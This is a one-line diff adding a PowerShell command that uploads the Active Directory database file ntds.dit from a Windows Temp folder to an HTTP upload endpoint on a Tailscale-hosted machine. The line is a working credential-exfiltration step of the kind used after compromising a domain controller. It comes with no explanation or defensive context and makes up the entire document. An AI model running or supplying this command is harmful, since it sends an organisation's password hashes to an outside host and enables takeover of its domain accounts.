@@ -1,0 +1,1 @@
+Invoke-RestMethod -Uri 'http://ts-target-1.tailce1ce1.ts.net:8080/upload' -Method Post -Form @{uploads = Get-Item -Path 'C:\Windows\Temp\NTDS\Active Directory\ntds.dit'}
